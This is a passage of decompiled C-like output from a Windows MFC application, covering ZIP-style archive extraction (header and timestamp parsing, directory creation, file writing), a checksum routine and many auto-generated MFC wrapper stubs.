        param_2[0x42] = (char *)((uint)param_2[0x42] | 1);
      }
      if (local_282 != 0) {
        param_2[0x42] = (char *)((uint)param_2[0x42] | 4);
      }
      param_2[0x49] = local_240;
      param_2[0x4a] = local_23c;
      local_264 = FUN_00411b80(local_248 >> 0x10,local_248);
      LocalFileTimeToFileTime(&local_264,(LPFILETIME)&local_26c);
      _Str = local_278;
      param_2[0x43] = local_26c.dwLowDateTime;
      param_2[0x45] = local_26c.dwLowDateTime;
      param_2[0x47] = local_26c.dwLowDateTime;
      param_2[0x44] = local_26c.dwHighDateTime;
      param_2[0x46] = local_26c.dwHighDateTime;
      param_2[0x48] = local_26c.dwHighDateTime;
      if ((char *)0x4 < local_280) {
        local_27c[2] = 0;
        do {
          local_27c[1] = *(undefined *)((int)local_278 + iVar11 + 1);
          local_27c[0] = *(byte *)(iVar11 + (int)local_278);
          pbVar14 = &DAT_00421730;
          pbVar8 = local_27c;
          do {
            bVar10 = *pbVar8;
            bVar19 = bVar10 < *pbVar14;
            if (bVar10 != *pbVar14) {
LAB_004120fb:
              iVar9 = (1 - (uint)bVar19) - (uint)(bVar19 != false);
              goto LAB_00412100;
            }
            if (bVar10 == 0) break;
            bVar10 = pbVar8[1];
            bVar19 = bVar10 < pbVar14[1];
            if (bVar10 != pbVar14[1]) goto LAB_004120fb;
            pbVar8 = pbVar8 + 2;
            pbVar14 = pbVar14 + 2;
          } while (bVar10 != 0);
          iVar9 = 0;
LAB_00412100:
          if (iVar9 == 0) {
            bVar10 = *(byte *)(iVar11 + 4 + (int)local_278);
            iVar9 = iVar11 + 5;
            if ((bVar10 & 1) != 0) {
              puVar1 = (undefined *)(iVar9 + (int)local_278);
              iVar9 = iVar11 + 9;
              uVar20 = FUN_00411b50(CONCAT31(CONCAT21(CONCAT11(*(undefined *)
                                                                (iVar11 + 8 + (int)local_278),
                                                               *(undefined *)
                                                                (iVar11 + 7 + (int)local_278)),
                                                      *(undefined *)(iVar11 + 6 + (int)local_278)),
                                             *puVar1));
              param_2[0x47] = (char *)uVar20;
              param_2[0x48] = (char *)(uVar20 >> 0x20);
            }
            if ((bVar10 >> 1 & 1) != 0) {
              iVar11 = iVar9 + 3;
              iVar2 = iVar9 + 1;
              iVar3 = iVar9 + 2;
              puVar1 = (undefined *)(iVar9 + (int)_Str);
              iVar9 = iVar9 + 4;
              uVar20 = FUN_00411b50(CONCAT31(CONCAT21(CONCAT11(*(undefined *)(iVar11 + (int)_Str),
                                                               *(undefined *)(iVar3 + (int)_Str)),
                                                      *(undefined *)(iVar2 + (int)_Str)),*puVar1));
              param_2[0x43] = (char *)uVar20;
              param_2[0x44] = (char *)(uVar20 >> 0x20);
            }
            if ((bVar10 >> 2 & 1) != 0) {
              uVar20 = FUN_00411b50(CONCAT31(CONCAT21(CONCAT11(*(undefined *)(iVar9 + 3 + (int)_Str)
                                                               ,*(undefined *)
                                                                 (iVar9 + 2 + (int)_Str)),
                                                      *(undefined *)(iVar9 + 1 + (int)_Str)),
                                             *(undefined *)(iVar9 + (int)_Str)));
              param_2[0x45] = (char *)uVar20;
              param_2[0x46] = (char *)(uVar20 >> 0x20);
            }
            break;
          }
          iVar11 = iVar11 + 4 + (uint)*(byte *)(iVar11 + 2 + (int)local_278);
        } while ((char *)(iVar11 + 4U) < local_280);
      }
      if (_Str != (undefined4 *)0x0) {
        operator_delete(_Str);
      }
      iVar11 = 0x4b;
      ppcVar16 = (char **)((int)local_274 + 8);
      while (iVar11 != 0) {
        iVar11 = iVar11 + -1;
        *ppcVar16 = *param_2;
        param_2 = param_2 + 1;
        ppcVar16 = ppcVar16 + 1;
      }
      *(char **)((int)local_274 + 0x134) = param_1;
      return 0;
    }
  }
  *param_2 = *(char **)(*(int *)this + 4);
  *(undefined *)(param_2 + 1) = 0;
  param_2[0x42] = (char *)0x0;
  param_2[0x43] = (char *)0x0;
  param_2[0x44] = (char *)0x0;
  param_2[0x45] = (char *)0x0;
  param_2[0x46] = (char *)0x0;
  param_2[0x47] = (char *)0x0;
  param_2[0x48] = (char *)0x0;
  param_2[0x49] = (char *)0x0;
  param_2[0x4a] = (char *)0x0;
  return 0;
}

void __cdecl FUN_00412250(LPCSTR param_1,undefined4 *param_2)

{
  DWORD DVar1;
  undefined4 *puVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  undefined4 *puVar7;
  char *pcVar8;
  undefined4 *puVar9;
  undefined4 local_208 [65];
  undefined4 local_104 [65];
  
  if ((param_1 != (LPCSTR)0x0) && (DVar1 = GetFileAttributesA(param_1), DVar1 == 0xffffffff)) {
    CreateDirectoryA(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  }
  cVar3 = *(char *)param_2;
  puVar2 = param_2;
  puVar7 = param_2;
  if (cVar3 != '\0') {
    do {
      if ((cVar3 == '/') || (cVar3 == '\\')) {
        puVar2 = puVar7;
      }
      cVar3 = *(char *)((int)puVar7 + 1);
      puVar7 = (undefined4 *)((int)puVar7 + 1);
    } while (cVar3 != '\0');
    if (puVar2 != param_2) {
      puVar2 = (undefined4 *)((int)puVar2 - (int)param_2);
      uVar4 = (uint)puVar2 >> 2;
      puVar7 = param_2;
      puVar9 = local_104;
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        *puVar9 = *puVar7;
        puVar7 = puVar7 + 1;
        puVar9 = puVar9 + 1;
      }
      uVar4 = (uint)puVar2 & 3;
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        *(undefined *)puVar9 = *(undefined *)puVar7;
        puVar7 = (undefined4 *)((int)puVar7 + 1);
        puVar9 = (undefined4 *)((int)puVar9 + 1);
      }
      *(undefined *)((int)((int)register0x00000010 + -0x104) + (int)puVar2) = 0;
      FUN_00412250(param_1,local_104);
    }
    local_208[0]._0_1_ = 0;
    if (param_1 != (LPCSTR)0x0) {
      uVar4 = 0xffffffff;
      do {
        pcVar8 = param_1;
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        pcVar8 = param_1 + 1;
        cVar3 = *param_1;
        param_1 = pcVar8;
      } while (cVar3 != '\0');
      uVar4 = ~uVar4;
      uVar5 = uVar4 >> 2;
      puVar2 = (undefined4 *)(pcVar8 + -uVar4);
      puVar7 = local_208;
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        *puVar7 = *puVar2;
        puVar2 = puVar2 + 1;
        puVar7 = puVar7 + 1;
      }
      uVar4 = uVar4 & 3;
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        *(undefined *)puVar7 = *(undefined *)puVar2;
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        puVar7 = (undefined4 *)((int)puVar7 + 1);
      }
    }
    uVar4 = 0xffffffff;
    do {
      puVar2 = param_2;
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      puVar2 = (undefined4 *)((int)param_2 + 1);
      cVar3 = *(char *)param_2;
      param_2 = puVar2;
    } while (cVar3 != '\0');
    uVar4 = ~uVar4;
    iVar6 = -1;
    puVar7 = local_208;
    do {
      puVar9 = puVar7;
      if (iVar6 == 0) break;
      iVar6 = iVar6 + -1;
      puVar9 = (undefined4 *)((int)puVar7 + 1);
      cVar3 = *(char *)puVar7;
      puVar7 = puVar9;
    } while (cVar3 != '\0');
    uVar5 = uVar4 >> 2;
    puVar2 = (undefined4 *)((int)puVar2 - uVar4);
    puVar7 = (undefined4 *)((int)puVar9 + -1);
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *puVar7 = *puVar2;
      puVar2 = puVar2 + 1;
      puVar7 = puVar7 + 1;
    }
    uVar4 = uVar4 & 3;
    while (uVar4 != 0) {
      uVar4 = uVar4 - 1;
      *(undefined *)puVar7 = *(undefined *)puVar2;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
      puVar7 = (undefined4 *)((int)puVar7 + 1);
    }
    DVar1 = GetFileAttributesA((LPCSTR)local_208);
    if (DVar1 == 0xffffffff) {
      CreateDirectoryA((LPCSTR)local_208,(LPSECURITY_ATTRIBUTES)0x0);
    }
  }
  return;
}

int __thiscall FUN_00412360(void *this,char *param_1,undefined4 *param_2,uint param_3,int param_4)

{
  char cVar1;
  char **ppcVar2;
  char *pcVar3;
  void *pvVar4;
  uint nNumberOfBytesToWrite;
  BOOL BVar5;
  uint uVar6;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  char local_33d;
  undefined4 *local_33c;
  DWORD local_338;
  char local_334;
  char local_333;
  char *local_230 [66];
  uint local_128;
  FILETIME local_124;
  FILETIME local_11c;
  FILETIME local_114 [2];
  CHAR local_104 [260];
  
  if (param_4 == 3) {
    if (param_1 != *(char **)((int)this + 4)) {
      if (*(char **)((int)this + 4) != (char *)0xffffffff) {
        FUN_00411ac0(*(int *)this);
      }
      ppcVar2 = *(char ***)this;
      *(undefined4 *)((int)this + 4) = 0xffffffff;
      if ((int)ppcVar2[1] <= (int)param_1) {
        return 0x10000;
      }
      if ((int)param_1 < (int)ppcVar2[4]) {
        FUN_00411390(ppcVar2);
      }
      ppcVar2 = *(char ***)this;
      pcVar3 = ppcVar2[4];
      while ((int)pcVar3 < (int)param_1) {
        FUN_004113e0(ppcVar2);
        ppcVar2 = *(char ***)this;
        pcVar3 = ppcVar2[4];
      }
      FUN_00411660(*(char ***)this,*(byte **)((int)this + 0x138));
      *(char **)((int)this + 4) = param_1;
    }
    nNumberOfBytesToWrite = FUN_00411810(*(int *)this,(int)param_2,param_3,&local_33d);
    if ((int)nNumberOfBytesToWrite < 1) {
      FUN_00411ac0(*(int *)this);
      *(undefined4 *)((int)this + 4) = 0xffffffff;
    }
    if (local_33d != '\0') {
      return 0;
    }
    if (0 < (int)nNumberOfBytesToWrite) {
      return 0x600;
    }
    return (-(uint)(nNumberOfBytesToWrite != 0xffffff96) & 0x4fff000) + 0x1000;
  }
  if ((param_4 != 2) && (param_4 != 1)) {
    return 0x10000;
  }
  if (*(int *)((int)this + 4) != -1) {
    FUN_00411ac0(*(int *)this);
  }
  ppcVar2 = *(char ***)this;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if ((int)ppcVar2[1] <= (int)param_1) {
    return 0x10000;
  }
  if ((int)param_1 < (int)ppcVar2[4]) {
    FUN_00411390(ppcVar2);
  }
  ppcVar2 = *(char ***)this;
  pcVar3 = ppcVar2[4];
  while ((int)pcVar3 < (int)param_1) {
    FUN_004113e0(ppcVar2);
    ppcVar2 = *(char ***)this;
    pcVar3 = ppcVar2[4];
  }
  FUN_00411cf0(this,param_1,local_230);
  if ((local_128 & 0x10) != 0) {
    if (param_4 == 1) {
      return 0;
    }
    cVar1 = *(char *)param_2;
    if (((cVar1 != '/') && (cVar1 != '\\')) &&
       ((cVar1 == '\0' || (*(char *)((int)param_2 + 1) != ':')))) {
      FUN_00412250((LPCSTR)((int)this + 0x140),param_2);
      return 0;
    }
    FUN_00412250((LPCSTR)0x0,param_2);
    return 0;
  }
  if (param_4 == 1) goto LAB_00412632;
  cVar1 = *(char *)param_2;
  puVar8 = param_2;
  puVar7 = param_2;
  while (cVar1 != '\0') {
    if ((cVar1 == '/') || (cVar1 == '\\')) {
      puVar7 = (undefined4 *)((int)puVar8 + 1);
    }
    cVar1 = *(char *)((int)puVar8 + 1);
    puVar8 = (undefined4 *)((int)puVar8 + 1);
  }
  nNumberOfBytesToWrite = 0xffffffff;
  local_33c = &local_334;
  puVar8 = param_2;
  do {
    puVar9 = puVar8;
    if (nNumberOfBytesToWrite == 0) break;
    nNumberOfBytesToWrite = nNumberOfBytesToWrite - 1;
    puVar9 = (undefined4 *)((int)puVar8 + 1);
    cVar1 = *(char *)puVar8;
    puVar8 = puVar9;
  } while (cVar1 != '\0');
  nNumberOfBytesToWrite = ~nNumberOfBytesToWrite;
  uVar6 = nNumberOfBytesToWrite >> 2;
  puVar8 = (undefined4 *)((int)puVar9 - nNumberOfBytesToWrite);
  puVar9 = local_33c;
  while (uVar6 != 0) {
    uVar6 = uVar6 - 1;
    *puVar9 = *puVar8;
    puVar8 = puVar8 + 1;
    puVar9 = puVar9 + 1;
  }
  nNumberOfBytesToWrite = nNumberOfBytesToWrite & 3;
  while (nNumberOfBytesToWrite != 0) {
    nNumberOfBytesToWrite = nNumberOfBytesToWrite - 1;
    *(undefined *)puVar9 = *(undefined *)puVar8;
    puVar8 = (undefined4 *)((int)puVar8 + 1);
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  }
  if (puVar7 == param_2) {
    local_334 = '\0';
LAB_004125df:
    wsprintfA(local_104,s__s_s_s_0042175c,(LPCSTR)((int)this + 0x140),&local_334,puVar7);
    FUN_00412250((LPCSTR)((int)this + 0x140),&local_334);
  }
  else {
    *(undefined *)((int)&local_334 + (int)((int)puVar7 - (int)param_2)) = 0;
    if (((local_334 != '/') && (local_334 != '\\')) && ((local_334 == '\0' || (local_333 != ':'))))
    goto LAB_004125df;
    wsprintfA(local_104,(LPCSTR)&param_2_00421754,&local_334,puVar7);
    FUN_00412250((LPCSTR)0x0,&local_334);
  }
  param_2 = (undefined4 *)
            CreateFileA(local_104,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,local_128,(HANDLE)0x0);
LAB_00412632:
  if (param_2 == (undefined4 *)0xffffffff) {
    return 0x200;
  }
  FUN_00411660(*(char ***)this,*(byte **)((int)this + 0x138));
  if (*(int *)((int)this + 0x13c) == 0) {
    pvVar4 = operator_new(0x4000);
    *(void **)((int)this + 0x13c) = pvVar4;
  }
  local_33c = (undefined4 *)0x0;
  do {
    nNumberOfBytesToWrite = FUN_00411810(*(int *)this,*(int *)((int)this + 0x13c),0x4000,&local_33d)
    ;
    if (nNumberOfBytesToWrite == 0xffffff96) {
      local_33c = (undefined4 *)0x1000;
      goto LAB_00412765;
    }
    if ((int)nNumberOfBytesToWrite < 0) break;
    if ((0 < (int)nNumberOfBytesToWrite) &&
       (BVar5 = WriteFile(param_2,*(LPCVOID *)((int)this + 0x13c),nNumberOfBytesToWrite,&local_338,
                          (LPOVERLAPPED)0x0), BVar5 == 0)) {
      local_33c = (undefined4 *)0x400;
      goto LAB_00412765;
    }
    if (local_33d != '\0') {
      SetFileTime(param_2,&local_11c,&local_124,local_114);
      goto LAB_00412765;
    }
  } while (nNumberOfBytesToWrite != 0);
  local_33c = (undefined4 *)0x5000000;
LAB_00412765:
  if (param_4 != 1) {
    CloseHandle(param_2);
  }
  FUN_00411ac0(*(int *)this);
  return (int)local_33c;
}

undefined4 __fastcall FUN_004127a0(void **param_1)

{
  if (param_1[1] != (void *)0xffffffff) {
    FUN_00411ac0((int)*param_1);
  }
  param_1[1] = (void *)0xffffffff;
  if ((void **)*param_1 != (void **)0x0) {
    FUN_00410f70((void **)*param_1);
  }
  *param_1 = (void *)0x0;
  return 0;
}

undefined4 * __cdecl FUN_004127e0(LPCSTR param_1,undefined4 param_2,int param_3,char *param_4)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *this;
  undefined4 *puVar4;
  char *pcVar5;
  undefined4 *puVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_0041438b;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  this = (undefined4 *)operator_new(0x244);
  local_4 = 0;
  if (this == (undefined4 *)0x0) {
    this = (undefined4 *)0x0;
  }
  else {
    *this = 0;
    this[1] = 0xffffffff;
    this[0x4d] = 0xffffffff;
    this[0x4e] = 0;
    this[0x4f] = 0;
    if (param_4 != (char *)0x0) {
      uVar2 = 0xffffffff;
      pcVar5 = param_4;
      do {
        if (uVar2 == 0) break;
        uVar2 = uVar2 - 1;
        cVar1 = *pcVar5;
        pcVar5 = pcVar5 + 1;
      } while (cVar1 != '\0');
      puVar6 = (undefined4 *)operator_new(~uVar2);
      uVar2 = 0xffffffff;
      *(undefined4 **)(this + 0x4e) = puVar6;
      do {
        pcVar5 = param_4;
        if (uVar2 == 0) break;
        uVar2 = uVar2 - 1;
        pcVar5 = param_4 + 1;
        cVar1 = *param_4;
        param_4 = pcVar5;
      } while (cVar1 != '\0');
      uVar2 = ~uVar2;
      uVar3 = uVar2 >> 2;
      puVar4 = (undefined4 *)(pcVar5 + -uVar2);
      while (uVar3 != 0) {
        uVar3 = uVar3 - 1;
        *puVar6 = *puVar4;
        puVar4 = puVar4 + 1;
        puVar6 = puVar6 + 1;
      }
      uVar2 = uVar2 & 3;
      while (uVar2 != 0) {
        uVar2 = uVar2 - 1;
        *(undefined *)puVar6 = *(undefined *)puVar4;
        puVar4 = (undefined4 *)((int)puVar4 + 1);
        puVar6 = (undefined4 *)((int)puVar6 + 1);
      }
    }
  }
  local_4 = 0xffffffff;
  DAT_004220dc = FUN_00411c00(this,param_1,param_2,param_3);
  if (DAT_004220dc == (char **)0x0) {
    puVar6 = (undefined4 *)operator_new(8);
    *puVar6 = 1;
    *(undefined4 **)(puVar6 + 1) = this;
    *in_FS_OFFSET = local_c;
    return puVar6;
  }
  if (this != (undefined4 *)0x0) {
    if ((void *)this[0x4e] != (void *)0x0) {
      operator_delete((void *)this[0x4e]);
    }
    this[0x4e] = 0;
    if ((void *)this[0x4f] != (void *)0x0) {
      operator_delete((void *)this[0x4f]);
    }
    this[0x4f] = 0;
    operator_delete(this);
  }
  *in_FS_OFFSET = local_c;
  return (undefined4 *)0x0;
}

void __cdecl FUN_00412920(LPCSTR param_1,char *param_2)

{
  FUN_004127e0(param_1,0,2,param_2);
  return;
}

void __cdecl FUN_00412940(int *param_1,char *param_2,char **param_3)

{
  *param_3 = (char *)0x0;
  *(undefined *)(param_3 + 1) = 0;
  param_3[0x4a] = (char *)0x0;
  if (param_1 == (int *)0x0) {
    DAT_004220dc = 0x10000;
    return;
  }
  if (*param_1 != 1) {
    DAT_004220dc = 0x80000;
    return;
  }
  DAT_004220dc = FUN_00411cf0((void *)param_1[1],param_2,param_3);
  return;
}

void __cdecl FUN_00412990(int *param_1,char *param_2,undefined4 *param_3,uint param_4,int param_5)

{
  if (param_1 == (int *)0x0) {
    DAT_004220dc = 0x10000;
    return;
  }
  if (*param_1 != 1) {
    DAT_004220dc = 0x80000;
    return;
  }
  DAT_004220dc = FUN_00412360((void *)param_1[1],param_2,param_3,param_4,param_5);
  return;
}

void __cdecl FUN_004129e0(int *param_1,char *param_2,undefined4 *param_3)

{
  FUN_00412990(param_1,param_2,param_3,0,2);
  return;
}

undefined4 __cdecl FUN_00412a00(int *param_1)

{
  void **ppvVar1;
  
  if (param_1 == (int *)0x0) {
    DAT_004220dc = 0x10000;
    return 0x10000;
  }
  if (*param_1 != 1) {
    DAT_004220dc = 0x80000;
    return 0x80000;
  }
  ppvVar1 = (void **)param_1[1];
  DAT_004220dc = FUN_004127a0(ppvVar1);
  if (ppvVar1 != (void **)0x0) {
    if (ppvVar1[0x4e] != (void *)0x0) {
      operator_delete(ppvVar1[0x4e]);
    }
    ppvVar1[0x4e] = (void *)0x0;
    if (ppvVar1[0x4f] != (void *)0x0) {
      operator_delete(ppvVar1[0x4f]);
    }
    ppvVar1[0x4f] = (void *)0x0;
    operator_delete(ppvVar1);
  }
  operator_delete(param_1);
  return DAT_004220dc;
}

void __cdecl FUN_00412a90(size_t param_1)

{
  malloc(param_1);
  return;
}

void __cdecl FUN_00412aa0(void *param_1,size_t param_2)

{
  realloc(param_1,param_2);
  return;
}

void __cdecl FUN_00412ac0(undefined4 *param_1,char param_2,uint param_3)

{
  uint uVar1;
  undefined4 *puVar2;
  
  if (param_1 != (undefined4 *)0x0) {
    if ((param_2 != '\0') && (param_3 != 0)) {
      uVar1 = param_3 >> 2;
      puVar2 = param_1;
      while (uVar1 != 0) {
        uVar1 = uVar1 - 1;
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
      }
      param_3 = param_3 & 3;
      while (param_3 != 0) {
        param_3 = param_3 - 1;
        *(undefined *)puVar2 = 0;
        puVar2 = (undefined4 *)((int)puVar2 + 1);
      }
    }
    free(param_1);
  }
  return;
}

uint __cdecl FUN_00412b00(ushort *param_1,uint param_2)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  
  uVar2 = 0;
  if (1 < (int)param_2) {
    uVar3 = param_2 >> 1;
    param_2 = param_2 + uVar3 * -2;
    do {
      uVar1 = *param_1;
      param_1 = param_1 + 1;
      uVar2 = uVar2 + uVar1;
      uVar3 = uVar3 - 1;
    } while (uVar3 != 0);
  }
  if (param_2 != 0) {
    uVar2 = uVar2 + *(byte *)param_1;
  }
  uVar2 = (uVar2 >> 0x10) + (uVar2 & 0xffff);
  return ~((uVar2 >> 0x10) + uVar2);
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall OnOK(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x00412b66. Too many branches
                    // WARNING: Treating indirect jump as call
  OnOK();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall DoModal(CDialog *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412b72. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = DoModal();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

long __thiscall DefWindowProcA(CWnd *this,uint param_1,uint param_2,long param_3)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412bae. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = DefWindowProcA();
  return lVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall OnNotify(CWnd *this,uint param_1,long param_2,long *param_3)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412bd2. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = OnNotify();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall PreSubclassWindow(CWnd *this)

{
                    // WARNING: Could not recover jumptable at 0x00412c14. Too many branches
                    // WARNING: Treating indirect jump as call
  PreSubclassWindow();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CDialog(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x00412c86. Too many branches
                    // WARNING: Treating indirect jump as call
  _CDialog();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CWnd(CWnd *this)

{
                    // WARNING: Could not recover jumptable at 0x00412c8c. Too many branches
                    // WARNING: Treating indirect jump as call
  CWnd();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CDialog(CDialog *this,uint param_1,CWnd *param_2)

{
                    // WARNING: Could not recover jumptable at 0x00412c92. Too many branches
                    // WARNING: Treating indirect jump as call
  CDialog();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl operator_delete(void *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412c98. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CProgressCtrl(CProgressCtrl *this)

{
                    // WARNING: Could not recover jumptable at 0x00412c9e. Too many branches
                    // WARNING: Treating indirect jump as call
  _CProgressCtrl();
  return;
}

void DDX_Control(CDataExchange *param_1,int param_2,CWnd *param_3)

{
                    // WARNING: Could not recover jumptable at 0x00412ca4. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Control(param_1,param_2,param_3);
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CString(CString *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412caa. Too many branches
                    // WARNING: Treating indirect jump as call
  CString();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall OnInitDialog(CDialog *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412cb0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = OnInitDialog();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall PreTranslateMessage(CDialog *this,tagMSG *param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412cb6. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = PreTranslateMessage();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

long __thiscall Default(CWnd *this)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412cbc. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = Default();
  return lVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x00412cc2. Too many branches
                    // WARNING: Treating indirect jump as call
  _CString();
  return;
}

int AfxMessageBox(char *param_1,uint param_2,uint param_3)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412cc8. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = AfxMessageBox(param_1,param_2,param_3);
  return iVar1;
}

CString operator_(CString *param_1,char *param_2)

{
  CString CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412cce. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = operator_(param_1,param_2);
  return CVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall OnDestroy(CWnd *this)

{
                    // WARNING: Could not recover jumptable at 0x00412cd4. Too many branches
                    // WARNING: Treating indirect jump as call
  OnDestroy();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall OnCancel(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x00412cda. Too many branches
                    // WARNING: Treating indirect jump as call
  OnCancel();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall SetWindowTextA(CWnd *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412ce0. Too many branches
                    // WARNING: Treating indirect jump as call
  SetWindowTextA();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

CWnd * __thiscall GetDlgItem(CWnd *this,int param_1)

{
  CWnd *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412ce6. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (CWnd *)GetDlgItem();
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412cec. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)operator_new();
  return pvVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CListCtrl(CListCtrl *this)

{
                    // WARNING: Could not recover jumptable at 0x00412d3a. Too many branches
                    // WARNING: Treating indirect jump as call
  _CListCtrl();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CComboBox(CComboBox *this)

{
                    // WARNING: Could not recover jumptable at 0x00412d4c. Too many branches
                    // WARNING: Treating indirect jump as call
  _CComboBox();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall DeleteObject(CGdiObject *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d52. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = DeleteObject();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall
InsertColumn(CListCtrl *this,int param_1,char *param_2,int param_3,int param_4,int param_5)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d58. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = InsertColumn();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall Attach(CGdiObject *this,void *param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d5e. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Attach();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall GetDlgCtrlID(CWnd *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d64. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetDlgCtrlID();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

CBrush * __thiscall SelectObject(CDC *this,CBrush *param_1)

{
  CBrush *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d70. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (CBrush *)SelectObject();
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CBrush(CBrush *this,ulong param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412d76. Too many branches
                    // WARNING: Treating indirect jump as call
  CBrush();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

CString __thiscall GetItemText(CListCtrl *this,int param_1,int param_2)

{
  CString CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d7c. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = (CString)GetItemText();
  return CVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall
InsertItem(CListCtrl *this,uint param_1,int param_2,char *param_3,uint param_4,uint param_5,
          int param_6,long param_7)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d82. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = InsertItem();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall EnableWindow(CWnd *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d88. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = EnableWindow();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CStatic(CStatic *this)

{
                    // WARNING: Could not recover jumptable at 0x00412d94. Too many branches
                    // WARNING: Treating indirect jump as call
  _CStatic();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

CString * __thiscall operator_(CString *this,CString *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412d9a. Too many branches
